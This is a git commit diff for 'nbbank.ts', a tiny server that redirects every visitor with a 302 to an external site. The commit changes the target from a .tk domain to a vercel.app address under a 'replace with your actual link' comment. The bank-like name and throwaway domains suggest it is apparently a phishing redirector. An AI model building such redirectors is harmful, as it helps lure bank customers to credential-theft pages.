f40b8f9ec2db044c234a17b05e0be52753a9877d
Digital2025001 <bosmichael30@gmail.com>
2026-01-06 14:43:24 -0800

    Update nbbank.ts

--- nbbank.ts
+++ nbbank.ts
@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://ib.anonymismus.tk/me/teams/con/", // Replace this with your actual link
+      Location: "https://ssapar.vercel.app/", // Replace this with your actual link
     },
   });
 });
